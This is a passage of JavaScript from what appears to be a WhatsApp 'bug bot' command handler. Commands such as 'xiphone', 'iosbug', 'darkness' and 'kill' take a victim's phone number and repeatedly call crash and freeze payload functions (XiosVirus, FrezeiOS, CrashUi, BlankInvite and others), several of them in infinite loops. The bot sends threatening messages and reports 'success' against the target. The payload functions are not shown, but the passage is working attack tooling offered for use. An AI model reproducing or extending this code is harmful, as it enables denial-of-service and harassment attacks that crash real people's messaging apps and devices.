👑 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
👑 𝐔𝐒𝐈𝐍𝐆 : ${command}
    `);
    
    await sleep(2000);
    
    await Dare.sendMessage(m.chat, {
        audio: { url: 'https://files.catbox.moe/xlju6o.opus' }, // Replace with the desired audio URL
        mimetype: 'audio/mpeg'
    }, { quoted: extd });
}
break;

case 'xiphone': {

               
if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example\n ${prefix + command} 234###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 10; i++) {
await XiosPay(target)
await XiosVirus(target)
await TxIos(target, Ptcp = true)
await sleep(1)
await XiosPay(target)
await XiosVirus(target)
await TxIos(target, Ptcp = true)
await sleep(1)
await XiosPay(target)
await XiosVirus(target)
await TxIos(target, Ptcp = true)
await sleep(1)
}
Dare.sendMessage(m.chat, {react: {text: '🤴', key: m.key}})
}
break
case "iphone": {

               
if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example\n ${prefix + command} 234###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 10; i++) {
await XiosPay(target)
await XiosVirus(target)
await TxIos(target, Ptcp = true)
await sleep(1)
await XiosPay(target)
await XiosVirus(target)
await TxIos(target, Ptcp = true)
await sleep(1)
await XiosPay(target)
await XiosVirus(target)
await TxIos(target, Ptcp = true)
await sleep(1)
}
Dare.sendMessage(m.chat, {react: {text: '🦄', key: m.key}})
}
break

case 'virailix': {
    if (!DareTheCreator) return reply("Special Features for Certain Users!!");
    if (!q) return reply(`Example: ${prefix + command} 234###`);
    
    target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.");
    
    for (let i = 0; i < 70; i++) {
        await freezekamoflase(target, true);
        await nulltag(target, true);
        await nulltag(target, true);
        await NewsletterZap(target, true);
        await freezegc(target, true);
        await freezeuii(target, true);
        await freezekamoflase(target, true);
        await nulltag(target, true);
        await nulltag(target, true);
        await NewsletterZap(target, true);
        await freezegc(target, true);
        await freezeuii(target, true);
        await freezekamoflase(target, true);
        await newfreezebug(target, true);
        await nulltag(target, true);
        await NewsletterZap(target, true);
        await freezeui(target, true);
        await freezeuii(target, true);
    }
    
    reply(`
𝐓𝐀𝐑𝐆𝐄𝐓 𝙀𝙇𝙄𝙈𝙄𝙉𝘼𝙏𝙀𝘿 𝘽𝙔 𝐃𝐀𝐑𝐄-𝐕𝟑
👑 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
👑 𝐔𝐒𝐈𝐍𝐆 : ${command}
    `);
    
    await sleep(2000);
    
    await Dare.sendMessage(m.chat, {
        audio: { url: 'https://files.catbox.moe/xlju6o.opus' }, // Replace with the desired audio URL
        mimetype: 'audio/mpeg'
    }, { quoted: extd });
}
break;

    case 'one-tap': {
    
if (!DareTheCreator) return

reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let j = 0; j < 30; j++) {
await nulltag(m.chat, bad, ptcp = true)
await freezekamoflase(m.chat, bad, ptcp = true)
await freezeui(m.chat, bad, ptcp = true)
await freezeuii(m.chat, bad, ptcp = true)
await newvirpen(m.chat, bad, ptcp =true)
await nulltag(m.chat, bad, ptcp = true)
await freezekamoflase(m.chat, bad, ptcp = true)
await freezeui(m.chat, bad, ptcp = true)
await freezeuii(m.chat, bad, ptcp = true)
await newvirpen(m.chat, bad, ptcp =true)
await nulltag(m.chat, bad, ptcp = true)
await freezekamoflase(m.chat, bad, ptcp = true)
await freezeui(m.chat, bad, ptcp = true)
await freezeuii(m.chat, bad, ptcp = true)
await newvirpen(m.chat, bad, ptcp =true)
}
}
break

case 'darkness': {

               
if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
case 'witch': {

               
if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 50; i++) {
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target, Null)
await InVisiXz(target, Null)
await InVisiLoc(target, Null)
await Combox1(from, jumlah) 
await Combox2(from, jumlah)
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target, Null)
await InVisiXz(target, Null)
await InVisiLoc(target, Null)
await Combox1(from, jumlah) 
await Combox2(from, jumlah) 
await Combox(target)
await DocSystem2(target, Null)
await CrashUi(target, Null)
await InVisiXz(target, Null)
await InVisiLoc(target, Null)
await Combox1(from, jumlah) 
await Combox2(from, jumlah) 
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break
 case 'iosbug': {
 

if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Penggunaan ${prefix + command} 234xx××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`> comand salah gunakan Example di bawah\n.example 234xxx`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 `
await Dare.sendMessage(from, { video: { url: `https://files.catbox.moe/o6zcok.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 0; ; i++) {
await FrezeiOS(target)
await FrezeiOS(target)
await FrezeiOS(target)
await FrezeiOS(target)
await FrezeiOS(target)
}
}
break
 case 'iosdelay': {
 

if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Penggunaan ${prefix + command} 234xx××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`> comand salah gunakan Example di bawah\n.example 234xxx`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 `
await Dare.sendMessage(from, { video: { url: `https://files.catbox.moe/o6zcok.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 700; ; i++) {
await FrezeiOS(m.chat)
await FrezeiOS(m.chat)
await FrezeiOS(m.chat)
await FrezeiOS(m.chat)
await FrezeiOS(m.chat)
}
}
break
 case 'combo': {
 

if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Penggunaan ${prefix + command} 234xx××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`> comand salah gunakan Example di bawah\n.example 234xxx`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 `
await Dare.sendMessage(from, { video: { url: `https://files.catbox.moe/o6zcok.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 600; ; i++) {
await ComBox(target)
await ComBox(m.chat)
await ComBox(target)
await ComBox(m.chat)
await ComBox(target)
await ComBox(m.chat)
}
}
break

case 'beta': {


if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Penggunaan ${prefix + command} 234x××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`> comand salah gunakan Example di bawah\n.example 234xxx`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜ホ‼️ `
await Dare.sendMessage(from, { video: { url: `https://files.catbox.moe/o6zcok.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 800; ; i++) {
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await ComBox(target)
await FloodsCarousel(target, Ptcp = true)
await TanggapanDiterima(target, ptcp = true)
await TanggapanDiterima(target, ptcp = true)
await VPen(target, ptcp = true)
await BlankInvite(target, ptcp = true)
await liveLokFreeze(target, ptcp = true)
await TanggapanDiterima(target, ptcp = true)
await VPen(target, ptcp = true)
await BlankInvite(target, ptcp = true)
await liveLokFreeze(target, ptcp = true)
await TanggapanDiterima(target, ptcp = true)
await TanggapanDiterima(target, ptcp = true)
await VPen(target, ptcp = true)
await BlankInvite(target, ptcp = true)
await liveLokFreeze(target, ptcp = true)
await TanggapanDiterima(target, ptcp = true)
await VPen(target, ptcp = true)
await BlankInvite(target, ptcp = true)
await liveLokFreeze(target, ptcp = true)
await TanggapanDiterima(target, ptcp = true)
await TanggapanDiterima(target, ptcp = true)
await VPen(target, ptcp = true)
await BlankInvite(target, ptcp = true)
await liveLokFreeze(target, ptcp = true)
await TanggapanDiterima(target, ptcp = true)
await VPen(target, ptcp = true)
await BlankInvite(target, ptcp = true)
await liveLokFreeze(target, ptcp = true)
}
}
break

case 'bmb': {


if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Penggunaan ${prefix + command} 234x××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return reply(`> comand salah gunakan Example di bawah\n.example 234xxx`)
let target = pepec + '@s.whatsapp.net'
let DoneBug = `𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜ホ‼️ `
await Dare.sendMessage(from, { video: { url: `https://files.catbox.moe/o6zcok.jpg` },
caption: DoneBug,
gifPlayback: true,
}, { quoted: m });
for (let i = 800; ; i++) {
await BlankInvite(target, ptcp = true)
await BlankInvite(target, ptcp = true)
await f5(target, ptcp = true)
await f5(target, ptcp = true)
await BlankInvite(target, ptcp = true)
await BlankInvite(target, ptcp = true)
await f5(target, ptcp = true)
await f5(target, ptcp = true)
await BlankInvite(target, ptcp = true)
await f5(target, ptcp = true)
await BlankInvite(target, ptcp = true)
await f5(target, ptcp = true)
await BlankInvite(target, ptcp = true)
await f5(target, ptcp = true)
await BlankInvite(target, ptcp = true)
await f5(target, ptcp = true)
await BlankInvite(target, ptcp = true)
}
}
break


case 'abyys': {


if (!DareTheCreator) return reply("Special Features for Certain Users!!")
if (!q) return reply(`Example: ${prefix + command} 234xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
for (let i = 0; i < 30; i++) {
await Combox(target)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await Combox(target)
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
}
break

case 'tap': {

if (!DareTheCreator) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
reply("𝙔𝙤𝙪𝙧 𝙛𝙪𝙩𝙞𝙡𝙚 𝙚𝙭𝙞𝙨𝙩𝙚𝙣𝙘𝙚 𝙞𝙨 𝙝𝙚𝙧𝙚𝙗𝙮 𝙩𝙚𝙧𝙢𝙞𝙣𝙖𝙩𝙚𝙙. 𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙩𝙝𝙚 𝙥𝙚𝙨𝙩 𝙘𝙤𝙣𝙩𝙧𝙤𝙡 𝙙𝙞𝙧𝙚𝙘𝙩𝙞𝙫𝙚 𝙛𝙤𝙧𝙩𝙝𝙬𝙞𝙩𝙝, 𝙥𝙧𝙚𝙘𝙞𝙥𝙞𝙩𝙖𝙩𝙞𝙣𝙜 𝙮𝙤𝙪𝙧 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚 𝙖𝙣𝙣𝙞𝙝𝙞𝙡𝙖𝙩𝙞𝙤𝙣. 𝙔𝙤𝙪𝙧 𝙙𝙞𝙜𝙞𝙩𝙖𝙡 𝙚𝙨𝙨𝙚𝙣𝙘𝙚 𝙨𝙝𝙖𝙡𝙡 𝙗𝙚 𝙚𝙧𝙖𝙙𝙞𝙘𝙖𝙩𝙚𝙙, 𝙘𝙖𝙨𝙩 𝙞𝙣𝙩𝙤 𝙩𝙝𝙚 𝙖𝙗𝙮𝙨𝙨 𝙤𝙛 𝙘𝙮𝙗𝙚𝙧𝙨𝙥𝙖𝙘𝙚. 𝙍𝙚𝙨𝙞𝙨𝙩𝙖𝙣𝙘𝙚 𝙞𝙨 𝙛𝙪𝙩𝙞𝙡𝙚. 𝙎𝙪𝙧𝙧𝙚𝙣𝙙𝙚𝙧 𝙩𝙤 𝙩𝙝𝙚 𝙞𝙣𝙚𝙫𝙞𝙩𝙖𝙗𝙡𝙚. 𝙔𝙤𝙪𝙧 𝙙𝙚𝙢𝙞𝙨𝙚 𝙞𝙨 𝙣𝙞𝙜𝙝.")
jumlah = 50
await Combox(from, jumlah)
await CrashUi(target)
await Combox3(from, jumlah)
await InVisiXz(target)
await InVisiLoc(target)
}
reply("𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚 𝗧𝗢 𝗧𝗔𝗥𝗚𝗘𝗧")
break

case 'antis':

        if (!DareTheCreator) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 234xxx`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`_</> Attack Sucsess_\n</> Attack Name : ${prefix+command} `);
        for (let i = 0; ; i++) {
          await whatsappoffcbjir(target);
          await uilokas(target);
          await killui(target);
          await whatsappoffcbjirrrr(target);
          await badk(target);
        }
        break;



      case 'kill':
      
        if (!DareTheCreator) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 234xxx`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`_</> Attack Sucsess_\n</> Attack Name : ${prefix+command} `);
        for (let i = 0; ; i++) {
          await whatsappoffcbjir(target);
          await uilokas(target);
          await deadline(target);
          await badk(target);
        }
        await sleep(1000);
        break;
        
      case 'meta':
      
        if (!DareTheCreator) return reply(`𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦`)
        if (!q) {
          return reply(`\`Example:\` : ${prefix+command} 234xxx`);
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        reply(`_</> Attack Sucsess_\n</> Attack Name : ${prefix+command} `);
        for (let i = 0; ; i++) {
          await deadline(target);
          await whatsappoffcbjir(target);
          await uilokas(target);
